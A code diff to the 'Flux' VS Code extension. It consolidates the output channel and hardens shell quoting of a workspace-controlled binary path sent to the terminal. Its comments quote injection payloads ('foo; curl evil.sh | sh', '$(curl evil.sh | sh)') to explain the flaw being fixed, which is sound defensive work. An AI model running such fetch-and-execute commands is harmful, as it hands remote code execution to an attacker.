@@ -18,6 +18,28 @@ let client: LanguageClient | undefined;
 let statusBar: vscode.StatusBarItem | undefined;
 
 /**
+ * The extension's single output channel. Created once at `activate`; the
+ * previous per-invocation `createOutputChannel("Flux")` leaked a channel on
+ * every `flux.runOnDevice` call (audit §9.3).
+ */
+let outputChannel: vscode.OutputChannel | undefined;
+
+/**
+ * POSIX-shell-escapes `s` for safe inclusion in a command line sent to the
+ * integrated terminal. Single-quotes disable every expansion (word-splitting,
+ * `$`, backticks, `;`, `|`, `&`, `(`, `)`), and embedded single quotes are
+ * escaped as `'\''`.
+ *
+ * Replaces the previous `JSON.stringify(devBin)` guard, which wrapped the
+ * binary in double quotes but did **not** escape `$(...)` or backticks —
+ * inside double quotes those *are* expanded by the shell, so a malicious
+ * `flux.lspServerPath` of `"$(curl evil.sh | sh)"` still executed.
+ */
+function shellQuote(s: string): string {
+  return `'${s.replace(/'/g, "'\\''")}'`;
+}
+
+/**
  * Active WebSocket to the dev server telemetry endpoint, if connected.
  */
 let telemetrySocket: WebSocket | undefined;
@@ -88,22 +110,26 @@ function connectHotReloadStatus(port: number): void {
  * and prints the resulting URL to the output channel (FLUX-026 "Run on device").
  */
 async function runOnDevice(): Promise<void> {
-  const output = vscode.window.createOutputChannel("Flux");
-  output.show(true);
+  if (!outputChannel) {
+    return;
+  }
+  outputChannel.show(true);
   const fluxBin = vscode.workspace
     .getConfiguration("flux")
     .get<string>("lspServerPath", "flux-lsp");
   // The dev server binary is `flux` (flux-cli), resolved alongside flux-lsp.
   const devBin = fluxBin.replace(/flux-lsp$/, "flux") || "flux";
-  output.appendLine("Launching `flux dev --ws-host 0.0.0.0`…");
+  outputChannel.appendLine("Launching `flux dev --ws-host 0.0.0.0`…");
   const term = vscode.window.createTerminal({ name: "Flux dev (device)" });
-  // SECURITY: `devBin` comes from a per-workspace setting that a malicious
-  // repository could set to `foo; curl evil.sh | sh`. `JSON.stringify` wraps
-  // it in double quotes (escaping any embedded quotes/backslashes), so a shell
-  // injection through the setting is neutralized.
-  term.sendText(`${JSON.stringify(devBin)} dev --ws-host 0.0.0.0`);
+  // SECURITY: `devBin` comes from a per-workspace setting a malicious repo can
+  // control. `shellQuote` wraps it in single quotes (disabling every shell
+  // expansion — `$`, backticks, `;`, `|`, …) and escapes embedded single quotes
+  // as `'\''`. The previous `JSON.stringify(devBin)` guard was insufficient:
+  // it produced a *double*-quoted string, inside which `$(...)` and backticks
+  // are still expanded — `"$(curl evil.sh | sh)"` executed.
+  term.sendText(`${shellQuote(devBin)} dev --ws-host 0.0.0.0`);
   term.show();
-  output.appendLine(
+  outputChannel.appendLine(
     "Dev server exposing on 0.0.0.0. On the device, point the Flux app at this machine's LAN IP on :7331.",
   );
 }
@@ -113,6 +139,8 @@ async function runOnDevice(): Promise<void> {
  * the hot-reload status bar, and registers the Run-on-device command.
  */
 export function activate(context: vscode.ExtensionContext): void {
+  outputChannel = vscode.window.createOutputChannel("Flux");
+  context.subscriptions.push(outputChannel);
   statusBar = vscode.window.createStatusBarItem(
     vscode.StatusBarAlignment.Right,
     100,
@@ -177,6 +205,7 @@ export function activate(context: vscode.ExtensionContext): void {
 export function deactivate(): Thenable<void> | undefined {
   telemetrySocket?.close();
   telemetrySocket = undefined;
+  outputChannel = undefined;
   if (!client) {
     return undefined;
   }
